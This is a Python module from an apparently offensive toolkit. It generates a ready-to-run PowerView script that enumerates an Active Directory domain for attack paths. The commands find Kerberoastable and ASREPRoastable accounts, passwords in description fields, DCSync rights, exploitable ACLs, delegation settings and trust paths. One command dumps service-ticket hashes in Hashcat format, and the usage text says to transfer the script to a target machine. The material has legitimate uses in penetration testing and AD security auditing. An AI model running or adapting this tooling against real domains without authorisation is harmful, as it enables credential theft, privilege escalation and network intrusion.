"""
PowerView Auto-Enumeration Script Generator
Generates comprehensive PowerView enumeration scripts for AD environments
"""

from core.module_base import ModuleBase, ModuleType, Platform


class PowerViewAutoEnum(ModuleBase):
    """
    PowerView Auto-Enumeration Script Generator
    Creates comprehensive PowerView scripts for AD enumeration
    Based on common AD enumeration techniques
    """

    def __init__(self):
        super().__init__()
        self.name = "powerview_autoenum"
        self.description = "Generate PowerView auto-enumeration scripts"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "powerview", "enumeration", "script", "generator", "recon"]
        self.references = [
            "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
            "https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview"
        ]

        # Register options
        self.register_option("OUTPUT", "Output script file", default="powerview_enum.ps1")
        self.register_option("DOMAIN", "Target domain (optional, uses current if empty)", default="")
        self.register_option("DC_IP", "Domain Controller IP (optional)", default="")
        self.register_option("SECTIONS", "Sections to include",
                           default="all",
                           choices=["all", "domain", "users", "groups", "computers",
                                   "acls", "gpos", "trusts", "shares", "spns", "delegation"])
        self.register_option("OUTPUT_DIR", "Directory for enumeration output", default="C:\\AD_Enum")
        self.register_option("VERBOSE", "Include verbose output commands", default="yes",
                           choices=["yes", "no"])

        # Enumeration command templates
        self.enum_sections = {
            "domain": self._get_domain_enum(),
            "users": self._get_user_enum(),
            "groups": self._get_group_enum(),
            "computers": self._get_computer_enum(),
            "acls": self._get_acl_enum(),
            "gpos": self._get_gpo_enum(),
            "trusts": self._get_trust_enum(),
            "shares": self._get_share_enum(),
            "spns": self._get_spn_enum(),
            "delegation": self._get_delegation_enum(),
        }

    def _get_domain_enum(self) -> dict:
        return {
            "title": "Domain Information",
            "commands": [
                ("Get-Domain", "Basic domain information"),
                ("Get-DomainPolicy", "Domain password and Kerberos policies"),
                ("(Get-DomainPolicy).SystemAccess", "Password policy details"),
                ("(Get-DomainPolicy).KerberosPolicy", "Kerberos policy details"),
                ("Get-DomainController", "Domain Controllers"),
                ("Get-DomainController -Domain $domain | Select Name,IPAddress,OSVersion", "DC details"),
                ("Get-ForestDomain", "All domains in forest"),
                ("Get-ForestGlobalCatalog", "Global Catalog servers"),
                ("[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites", "AD Sites"),
            ]
        }

    def _get_user_enum(self) -> dict:
        return {
            "title": "User Enumeration",
            "commands": [
                # Basic user enumeration
                ("(Get-DomainUser).count",
                 "Total user count in domain"),
                ("Get-DomainUser | Select samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol",
                 "All domain users with key attributes"),
                ("Get-DomainUser * | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-Csv .\\domain_users.csv -NoTypeInformation",
                 "Export all users to CSV for offline analysis"),

                # Passwords in descriptions (CRITICAL!)
                ("Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}",
                 "Users with descriptions (may contain passwords!)"),

                # Kerberoasting targets
                ("Get-DomainUser -SPN | Select samaccountname,serviceprincipalname,memberof",
                 "Kerberoastable users (users with SPNs)"),
                ("Get-DomainUser * -SPN | select samaccountname",
                 "All users with SPNs (quick list)"),

                # ASREPRoasting targets
                ("Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof",
                 "ASREPRoastable users (DONT_REQ_PREAUTH set)"),
                ("Get-DomainUser -PreauthNotRequired | Select samaccountname",
                 "ASREPRoastable users - simple list"),

                # Delegation attacks
                ("Get-DomainUser -TrustedToAuth | Select samaccountname,'msds-allowedtodelegateto'",
                 "Users with Kerberos constrained delegation"),
                ("Get-DomainUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'",
                 "Users with unconstrained delegation (TRUSTED_FOR_DELEGATION)"),
                ("Get-DomainUser -AllowDelegation | Where {$_.useraccountcontrol -notmatch 'NOT_DELEGATED'} | Select samaccountname",
                 "Users allowing delegation"),

                # Privileged users
                ("Get-DomainUser -AdminCount | Select samaccountname",
                 "Protected users (AdminCount=1)"),

                # Foreign domain users
                ("Get-DomainGroup -Identity administrators | select member",
                 "Users in Administrators group (check for foreign domain users)"),
                ("Find-ForeignGroup",
                 "Foreign group members from other domains"),
                ("Find-ForeignUser",
                 "Foreign users in current domain"),

                # SID History (potential privilege escalation)
                ("Get-DomainUser -LDAPFilter '(sidHistory=*)' | Select samaccountname,sidhistory",
                 "Users with SID History (potential privesc)"),

                # Account status
                ("Get-DomainUser | Where {$_.useraccountcontrol -band 0x10000}",
                 "Users with password never expires (DONT_EXPIRE_PASSWORD)"),
                ("Get-DomainUser | Where {$_.pwdlastset -eq 0}",
                 "Users who must change password at next logon"),
                ("Get-DomainUser | Where {$_.useraccountcontrol -match 'ACCOUNTDISABLE'} | Select samaccountname",
                 "Disabled user accounts"),

                # Password set times (for password spraying analysis)
                ("Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset",
                 "All users sorted by password set time"),
                ("Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }",
                 "Users with passwords older than 90 days (weak password candidates)"),
                ("Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-365) }",
                 "Users with passwords older than 1 year (priority targets)"),

                # Cross-domain Kerberoasting
                ("Get-DomainUser -SPN -Domain $trustedDomain | select samaccountname,memberof,serviceprincipalname",
                 "Kerberoastable users in trusted domains"),
            ]
        }

    def _get_group_enum(self) -> dict:
        return {
            "title": "Group Enumeration",
            "commands": [
                # Basic group enumeration
                ("Get-DomainGroup -Properties Name | Select name",
                 "All domain group names"),
                ("(Get-DomainGroup).count",
                 "Total group count"),
                ("Get-DomainGroup | Select samaccountname,description,member",
                 "All domain groups with members"),

                # Protected/Admin groups
                ("Get-DomainGroup -AdminCount | Select samaccountname",
                 "Protected groups (AdminCount=1)"),

                # High-value group membership
                ("Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Select MemberName",
                 "Domain Admins (recursive)"),
                ("Get-DomainGroupMember -Identity 'Enterprise Admins' -Recurse | Select MemberName",
                 "Enterprise Admins (recursive)"),
                ("Get-DomainGroupMember -Identity 'Administrators' -Recurse | Select MemberName",
                 "Builtin Administrators (recursive)"),
                ("Get-DomainGroupMember -Identity 'Schema Admins' | Select MemberName",
                 "Schema Admins"),
                ("Get-DomainGroupMember -Identity 'Account Operators' | Select MemberName",
                 "Account Operators (can create/modify users)"),
                ("Get-DomainGroupMember -Identity 'Backup Operators' | Select MemberName",
                 "Backup Operators (can backup DC)"),
                ("Get-DomainGroupMember -Identity 'Server Operators' | Select MemberName",
                 "Server Operators"),
                ("Get-DomainGroupMember -Identity 'Print Operators' | Select MemberName",
                 "Print Operators (can load drivers on DC)"),
                ("Get-DomainGroupMember -Identity 'Hyper-V Administrators' | Select MemberName",
                 "Hyper-V Administrators (equals DA if virtual DCs exist)"),
                ("Get-DomainGroupMember -Identity 'Group Policy Creator Owners' | Select MemberName",
                 "GPO Creators (can create GPOs)"),

                # Sensitive groups for lateral movement
                ("Get-DomainGroupMember -Identity 'DNS Admins' | Select MemberName",
                 "DNS Admins (potential privesc via DLL injection)"),
                ("Get-DomainGroupMember -Identity 'DnsAdmins' | Select MemberName",
                 "DnsAdmins alternate name"),
                ("Get-DomainGroupMember -Identity 'Remote Desktop Users' | Select MemberName",
                 "Remote Desktop Users"),
                ("Get-DomainGroupMember -Identity 'Remote Management Users' | Select MemberName",
                 "Remote Management Users (WinRM)"),
                ("Get-DomainGroupMember -Identity 'LAPS Admins' | Select MemberName",
                 "LAPS Admins (can read LAPS passwords)"),

                # Exchange groups (high-value targets)
                ("Get-DomainGroupMember -Identity 'Exchange Trusted Subsystem' | Select MemberName",
                 "Exchange Trusted Subsystem (WriteDACL on domain)"),
                ("Get-DomainGroupMember -Identity 'Exchange Windows Permissions' | Select MemberName",
                 "Exchange Windows Permissions (WriteDACL on domain)"),
                ("Get-DomainGroupMember -Identity 'Organization Management' | Select MemberName",
                 "Organization Management (Exchange admins)"),

                # Managed Security Groups (potential lateral movement)
                ("Find-ManagedSecurityGroups | select GroupName",
                 "Managed security groups"),
                ("Get-DomainManagedSecurityGroup",
                 "Managed security groups with managers"),
                ("Get-DomainGroup -Properties * | Where {$_.managedby -ne $null} | Select samaccountname,managedby",
                 "Groups with managers set"),

                # Local group enumeration on specific hosts
                ("Get-NetLocalGroup -ComputerName $env:COMPUTERNAME | select GroupName",
                 "Local groups on current host"),
                ("Get-NetLocalGroupMember -ComputerName $env:COMPUTERNAME",
                 "Local group members on current host"),
                ("Find-DomainLocalGroupMember -ComputerName WS01 -GroupName 'Administrators'",
                 "Domain users in local Administrators on WS01"),
                ("Find-DomainLocalGroupMember -ComputerName WS01 -GroupName 'Remote Management Users'",
                 "Domain users in Remote Management Users on WS01"),

                # Custom/interesting groups
                ("Get-DomainGroup -Identity 'Help Desk' | Select member",
                 "Help Desk group members"),
                ("Get-DomainGroup -Identity 'Security Operations' | Select member",
                 "Security Operations group members"),
                ("Get-DomainGroup -Identity 'Protected Users' | Select member",
                 "Protected Users group members"),
            ]
        }

    def _get_computer_enum(self) -> dict:
        return {
            "title": "Computer Enumeration",
            "commands": [
                # Basic computer enumeration
                ("(Get-DomainComputer).count",
                 "Total computer count in domain"),
                ("Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol",
                 "All computers with key attributes"),
                ("Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol | Export-Csv .\\domain_computers.csv -NoTypeInformation",
                 "Export all computers to CSV"),

                # Operating System breakdown
                ("Get-DomainComputer -OperatingSystem '*Server*' | Select dnshostname,operatingsystem",
                 "All servers"),
                ("Get-DomainComputer -OperatingSystem '*Server 2022*' | Select dnshostname",
                 "Windows Server 2022"),
                ("Get-DomainComputer -OperatingSystem '*Server 2019*' | Select dnshostname",
                 "Windows Server 2019"),
                ("Get-DomainComputer -OperatingSystem '*Server 2016*' | Select dnshostname",
                 "Windows Server 2016"),
                ("Get-DomainComputer -OperatingSystem '*Server 2012*' | Select dnshostname",
                 "Windows Server 2012 (older, potential vulns)"),
                ("Get-DomainComputer -OperatingSystem '*Server 2008*' | Select dnshostname",
                 "Windows Server 2008 (legacy, EternalBlue potential)"),
                ("Get-DomainComputer -OperatingSystem '*Windows 11*' | Select dnshostname",
                 "Windows 11 workstations"),
                ("Get-DomainComputer -OperatingSystem '*Windows 10*' | Select dnshostname",
                 "Windows 10 workstations"),
                ("Get-DomainComputer -OperatingSystem '*Windows 7*' | Select dnshostname",
                 "Windows 7 (legacy, EternalBlue vulnerable!)"),

                # Delegation attacks
                ("Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol",
                 "Computers with unconstrained delegation (high-value!)"),
                ("Get-DomainComputer -TrustedToAuth | Select dnshostname,useraccountcontrol,'msds-allowedtodelegateto'",
                 "Computers with constrained delegation"),

                # Stale/vulnerable machines
                ("Get-DomainComputer -Properties dnshostname,lastlogontimestamp,operatingsystem | Where {$_.lastlogontimestamp -lt (Get-Date).AddDays(-90)}",
                 "Stale computers (90+ days, missing patches)"),
                ("Get-DomainComputer -Properties dnshostname,whencreated,operatingsystem | Sort-Object whencreated",
                 "Computers sorted by creation date (old = potential deviation from standard)"),

                # Passwords in descriptions
                ("Get-DomainComputer -Properties dnshostname,description | Where {$_.description -ne $null}",
                 "Computers with descriptions (may contain passwords!)"),

                # LAPS
                ("Get-DomainComputer -LDAPFilter '(ms-MCS-AdmPwd=*)' | Select dnshostname",
                 "LAPS-enabled computers"),

                # Specific computer details
                ("Get-DomainComputer -Identity DC01 -Properties *",
                 "Full details on DC01"),
                ("Get-DomainComputer -Identity WS01",
                 "Details on WS01 workstation"),

                # Find local admin access
                ("Find-LocalAdminAccess",
                 "Find computers where current user has local admin"),
                ("Find-LocalAdminAccess -ComputerDomain $domain",
                 "Find local admin across domain"),
            ]
        }

    def _get_acl_enum(self) -> dict:
        return {
            "title": "ACL Enumeration",
            "commands": [
                # Find interesting ACLs
                ("Find-InterestingDomainAcl -ResolveGUIDs",
                 "All interesting ACLs in domain (large output!)"),

                # Dangerous permissions - GenericAll (full control)
                ("Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'GenericAll'}",
                 "Objects with GenericAll (full control)"),

                # GenericWrite - can modify attributes
                ("Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'GenericWrite'}",
                 "Objects with GenericWrite (modify attributes, set SPN)"),

                # WriteOwner - can take ownership
                ("Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'WriteOwner'}",
                 "Objects with WriteOwner (can take ownership)"),

                # WriteDacl - can modify ACLs
                ("Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'WriteDacl'}",
                 "Objects with WriteDacl (can modify permissions)"),

                # ForceChangePassword
                ("Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.ObjectAceType -match 'User-Force-Change-Password'}",
                 "Objects with ForceChangePassword right"),

                # ACLs on specific users
                ("(Get-ACL 'AD:$((Get-ADUser joe.evans).distinguishedname)').access | ? {$_.ActiveDirectoryRights -match 'GenericAll'} | Select IdentityReference",
                 "Who has GenericAll over joe.evans"),

                # ACLs on high-value groups
                ("Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteOwner|WriteDacl'}",
                 "Who can modify Domain Admins group"),
                ("Get-DomainObjectAcl -Identity 'Enterprise Admins' -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteOwner|WriteDacl'}",
                 "Who can modify Enterprise Admins group"),

                # Current user's ACL rights
                ("$sid = (Get-DomainUser -Identity $env:USERNAME).objectsid; Get-DomainObjectAcl -ResolveGUIDs | Where {$_.SecurityIdentifier -eq $sid}",
                 "ACLs where current user has rights"),

                # DCSync rights enumeration
                ("Get-ObjectACL 'DC=inlanefreight,DC=local' -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object SecurityIdentifier | Sort-Object -Property SecurityIdentifier -Unique",
                 "Users with DCSync rights (SIDs)"),
                ("$dcsync = Get-ObjectACL 'DC=inlanefreight,DC=local' -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value; Convert-SidToName $dcsync",
                 "Users with DCSync rights (names)"),

                # AdminSDHolder ACLs
                ("Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=inlanefreight,DC=local' -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteOwner|WriteDacl'}",
                 "AdminSDHolder ACLs (propagates to protected objects)"),

                # Share enumeration and ACLs
                ("Get-NetShare",
                 "Shares on current computer"),
                ("Get-NetShare -ComputerName DC01",
                 "Shares on DC01"),
                ("Get-NetShare -ComputerName WS01",
                 "Shares on WS01"),
                ("Find-DomainShare -CheckShareAccess",
                 "Find accessible shares in domain"),
                ("Get-PathAcl '\\\\DC01\\SYSVOL'",
                 "ACLs on SYSVOL share"),
            ]
        }

    def _get_gpo_enum(self) -> dict:
        return {
            "title": "GPO Enumeration",
            "commands": [
                # Basic GPO enumeration
                ("Get-DomainGPO | select displayname",
                 "All GPO names in domain"),
                ("Get-DomainGPO | Select displayname,objectguid,gpcfilesyspath",
                 "All GPOs with GUID and path"),

                # GPOs applied to specific targets
                ("Get-DomainGPO -ComputerIdentity $env:COMPUTERNAME | Select displayname",
                 "GPOs applied to current computer"),
                ("Get-DomainGPO -ComputerIdentity WS01 | Select displayname",
                 "GPOs applied to WS01"),
                ("Get-DomainGPO -ComputerIdentity DC01 | Select displayname",
                 "GPOs applied to DC01"),

                # Specific GPO lookup
                ("Get-DomainGPO -Identity 'Audit Policy' | select displayname,objectguid",
                 "Get Audit Policy GPO details"),
                ("Get-DomainGPO -Identity 'Default Domain Policy' | select *",
                 "Default Domain Policy details"),

                # OUs and GPO links
                ("Get-DomainOU | Select name,gplink",
                 "OUs and linked GPOs"),
                ("Get-DomainOU | Where {$_.gplink} | Select name,gplink",
                 "OUs with GPOs linked"),

                # GPO local group modifications (privilege escalation paths)
                ("Get-DomainGPOLocalGroup | Select GPODisplayName,GroupName,GPOType",
                 "GPOs that modify local groups"),
                ("Get-DomainGPOUserLocalGroupMapping | Select ObjectName,GPODisplayName,ContainerName,ComputerName",
                 "Users with local admin via GPO"),
                ("Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity $env:COMPUTERNAME",
                 "Local admin rights on current computer via GPO"),

                # GPO permission abuse
                ("Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq 'S-1-5-21-2974783224-3764228556-2640795941-513'}",
                 "GPOs writeable by Domain Users"),
                ("Get-DomainGPO | Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'} | Select ObjectDN,ActiveDirectoryRights,SecurityIdentifier",
                 "GPOs with dangerous permissions"),

                # Built-in gpresult
                ("gpresult /r",
                 "GPO results for current user/computer (built-in)"),
            ]
        }

    def _get_trust_enum(self) -> dict:
        return {
            "title": "Trust Enumeration",
            "commands": [
                # Basic trust enumeration
                ("Get-DomainTrust",
                 "All domain trusts with type, attributes, and direction"),
                ("Get-DomainTrustMapping",
                 "Map all trusts for current domain and reachable domains"),
                ("Get-ForestTrust",
                 "Forest-level trusts"),
                ("Get-Forest",
                 "Current forest information"),
                ("Get-ForestDomain",
                 "All domains in the current forest"),

                # Trust direction analysis
                ("Get-DomainTrust | Where {$_.TrustDirection -eq 'Bidirectional'} | Select SourceName,TargetName,TrustType,TrustAttributes",
                 "Bidirectional trusts (attack in either direction)"),
                ("Get-DomainTrust | Where {$_.TrustDirection -eq 'Inbound'} | Select SourceName,TargetName,TrustType",
                 "Inbound trusts (we can be accessed from target)"),
                ("Get-DomainTrust | Where {$_.TrustDirection -eq 'Outbound'} | Select SourceName,TargetName,TrustType",
                 "Outbound trusts (we can access target)"),

                # Trust type analysis
                ("Get-DomainTrust | Where {$_.TrustAttributes -match 'WITHIN_FOREST'} | Select SourceName,TargetName",
                 "Parent-child trusts (within same forest, ExtraSids attack possible)"),
                ("Get-DomainTrust | Where {$_.TrustAttributes -match 'FOREST_TRANSITIVE'} | Select SourceName,TargetName",
                 "Forest transitive trusts (cross-forest attacks possible)"),
                ("Get-DomainTrust | Where {$_.TrustType -eq 'WINDOWS_ACTIVE_DIRECTORY'}",
                 "Windows AD trusts"),

                # Foreign principals (attack paths across trusts)
                ("Get-DomainForeignGroupMember",
                 "Foreign group members - users from other domains in local groups"),
                ("Get-DomainForeignUser",
                 "Foreign users in the domain"),
                ("Get-DomainForeignGroupMember -Domain <CHILD_DOMAIN>",
                 "Foreign group members in child domain (replace <CHILD_DOMAIN>)"),

                # Cross-trust Kerberoasting/ASREPRoasting
                ("Get-DomainUser -SPN -Domain <CHILD_DOMAIN> | Select samaccountname,serviceprincipalname",
                 "Kerberoastable users in child domain (cross-trust attack)"),
                ("Get-DomainUser -KerberosPreauthNotRequired -Domain <CHILD_DOMAIN>",
                 "ASREPRoastable users in child domain"),

                # SID History abuse check
                ("Get-DomainUser -Properties samaccountname,sidhistory | Where {$_.sidhistory -ne $null}",
                 "Users with SID History set (potential SID history abuse)"),
                ("Get-DomainGroup -Properties samaccountname,sidhistory | Where {$_.sidhistory -ne $null}",
                 "Groups with SID History set"),

                # Enumerate trusting domains
                ("Get-DomainComputer -Domain <CHILD_DOMAIN> | Select dnshostname",
                 "Computers in child domain (replace <CHILD_DOMAIN>)"),
                ("Get-DomainGroup -Domain <CHILD_DOMAIN> -AdminCount | Select samaccountname",
                 "Admin groups in child domain"),

                # Check for shared accounts across trusts
                ("Get-DomainUser | Where {$_.samaccountname -like '*_ADM*' -or $_.samaccountname -like '*admin*'}",
                 "Admin accounts (check for password reuse across trusts)"),
            ]
        }

    def _get_share_enum(self) -> dict:
        return {
            "title": "Share Enumeration",
            "commands": [
                ("Find-DomainShare",
                 "All accessible shares"),
                ("Find-DomainShare -CheckShareAccess",
                 "Shares with read access"),
                ("Find-InterestingDomainShareFile",
                 "Interesting files on shares"),
                ("Find-InterestingDomainShareFile -Include *.txt,*.doc*,*.xls*,*.pdf,*.config,*.ini",
                 "Specific file types"),
                ("Get-NetShare -ComputerName $env:COMPUTERNAME",
                 "Shares on current computer"),
            ]
        }

    def _get_spn_enum(self) -> dict:
        return {
            "title": "SPN Enumeration (Kerberoasting)",
            "commands": [
                ("Get-DomainUser -SPN | Select samaccountname,serviceprincipalname",
                 "All users with SPNs"),
                ("Get-DomainUser -SPN | Where {$_.admincount -eq 1} | Select samaccountname,serviceprincipalname",
                 "High-value SPNs (AdminCount=1)"),
                ("Get-DomainUser -SPN | Where {$_.memberof -match 'Admin'} | Select samaccountname,serviceprincipalname,memberof",
                 "Admin users with SPNs"),
                ("Get-DomainSPNTicket -SPN 'MSSQLSvc/server.domain.com'",
                 "Request TGS for specific SPN"),
                ("Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Select Hash | Out-File kerberoast_hashes.txt",
                 "Dump all SPN hashes (Kerberoast)"),
            ]
        }

    def _get_delegation_enum(self) -> dict:
        return {
            "title": "Delegation Enumeration",
            "commands": [
                ("Get-DomainComputer -Unconstrained | Select dnshostname",
                 "Unconstrained delegation (computers)"),
                ("Get-DomainUser -AllowDelegation | Where {$_.useraccountcontrol -notmatch 'NOT_DELEGATED'} | Select samaccountname",
                 "Users allowing delegation"),
                ("Get-DomainComputer -TrustedToAuth | Select dnshostname,'msds-allowedtodelegateto'",
                 "Constrained delegation (computers)"),
                ("Get-DomainUser -TrustedToAuth | Select samaccountname,'msds-allowedtodelegateto'",
                 "Constrained delegation (users)"),
                ("Get-DomainComputer | Where {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null} | Select dnshostname",
                 "Resource-based constrained delegation"),
            ]
        }

    def run(self) -> bool:
        output_file = self.get_option("OUTPUT")
        domain = self.get_option("DOMAIN")
        dc_ip = self.get_option("DC_IP")
        sections = self.get_option("SECTIONS")
        output_dir = self.get_option("OUTPUT_DIR")
        verbose = self.get_option("VERBOSE") == "yes"

        # Build script
        script_lines = []

        # Header
        script_lines.append("#" + "=" * 70)
        script_lines.append("# PowerView Auto-Enumeration Script")
        script_lines.append("# Generated by UwU Toolkit")
        script_lines.append("# Based on common AD PowerView enumeration techniques")
        script_lines.append("#" + "=" * 70)
        script_lines.append("")

        # Error handling
        script_lines.append("$ErrorActionPreference = 'SilentlyContinue'")
        script_lines.append("")

        # Setup output directory
        script_lines.append(f"$outputDir = '{output_dir}'")
        script_lines.append("if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir | Out-Null }")
        script_lines.append("$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'")
        script_lines.append("")

        # Domain variable
        if domain:
            script_lines.append(f"$domain = '{domain}'")
        else:
            script_lines.append("$domain = (Get-Domain).Name")
        script_lines.append("")

        # Import PowerView
        script_lines.append("# Import PowerView (adjust path as needed)")
        script_lines.append("# Import-Module .\\PowerView.ps1")
        script_lines.append("")

        # Helper function for output
        script_lines.append("function Write-EnumOutput {")
        script_lines.append("    param([string]$Section, [string]$Command, [string]$Description, $Data)")
        script_lines.append("    Write-Host \"`n[*] $Description\" -ForegroundColor Cyan")
        script_lines.append("    Write-Host \"    Command: $Command\" -ForegroundColor DarkGray")
        script_lines.append("    if ($Data) {")
        script_lines.append("        $Data | Format-Table -AutoSize")
        script_lines.append("        $outFile = \"$outputDir\\${Section}_${timestamp}.txt\"")
        script_lines.append("        $Data | Out-File -Append $outFile")
        script_lines.append("    }")
        script_lines.append("}")
        script_lines.append("")

        # Determine which sections to include
        if sections == "all":
            sections_to_run = list(self.enum_sections.keys())
        else:
            sections_to_run = [sections]

        # Generate commands for each section
        for section_name in sections_to_run:
            if section_name not in self.enum_sections:
                continue

            section_data = self.enum_sections[section_name]
            script_lines.append("#" + "-" * 70)
            script_lines.append(f"# {section_data['title']}")
            script_lines.append("#" + "-" * 70)
            script_lines.append(f"Write-Host \"`n{'='*60}\" -ForegroundColor Yellow")
            script_lines.append(f"Write-Host \"[+] {section_data['title']}\" -ForegroundColor Green")
            script_lines.append(f"Write-Host \"{'='*60}\" -ForegroundColor Yellow")
            script_lines.append("")

            for cmd, desc in section_data["commands"]:
                # Escape special characters for the script
                cmd_escaped = cmd.replace('"', '`"')
                script_lines.append(f"# {desc}")
                script_lines.append("try {")
                if verbose:
                    script_lines.append(f"    Write-Host \"[*] {desc}\" -ForegroundColor Cyan")
                    script_lines.append(f"    Write-Host \"    Command: {cmd}\" -ForegroundColor DarkGray")
                script_lines.append(f"    $result = {cmd}")
                script_lines.append("    if ($result) {")
                script_lines.append("        $result | Format-Table -AutoSize")
                script_lines.append(f"        $result | Out-File -Append \"$outputDir\\{section_name}_$timestamp.txt\"")
                script_lines.append("    }")
                script_lines.append("} catch { Write-Host \"    [-] Error: $_\" -ForegroundColor Red }")
                script_lines.append("")

        # Summary section
        script_lines.append("#" + "-" * 70)
        script_lines.append("# Summary")
        script_lines.append("#" + "-" * 70)
        script_lines.append("Write-Host \"`n\" + '='*60 -ForegroundColor Yellow")
        script_lines.append("Write-Host \"[+] Enumeration Complete!\" -ForegroundColor Green")
        script_lines.append("Write-Host '='*60 -ForegroundColor Yellow")
        script_lines.append("Write-Host \"Output saved to: $outputDir\" -ForegroundColor Cyan")
        script_lines.append("Get-ChildItem $outputDir -Filter \"*_$timestamp.txt\" | Select Name,Length")

        # Write to file
        script_content = "\n".join(script_lines)

        try:
            with open(output_file, 'w') as f:
                f.write(script_content)
            self.print_good(f"PowerView enumeration script saved to: {output_file}")
            self.print_line()

            # Display preview
            self.print_status("Script Preview (first 50 lines):")
            self.print_line("-" * 60)
            for line in script_lines[:50]:
                self.print_line(line)
            self.print_line("...")
            self.print_line("-" * 60)
            self.print_line()

            self.print_status("Sections included:")
            for section in sections_to_run:
                if section in self.enum_sections:
                    cmd_count = len(self.enum_sections[section]["commands"])
                    self.print_line(f"  - {self.enum_sections[section]['title']}: {cmd_count} commands")

            self.print_line()
            self.print_status("Usage Instructions:")
            self.print_line("1. Transfer script to target Windows machine")
            self.print_line("2. Import PowerView: Import-Module .\\PowerView.ps1")
            self.print_line(f"3. Run script: .\\{output_file}")
            self.print_line(f"4. Results saved to: {output_dir}")

            return True

        except Exception as e:
            self.print_error(f"Failed to write script: {e}")
            return False

    def check(self) -> bool:
        return True
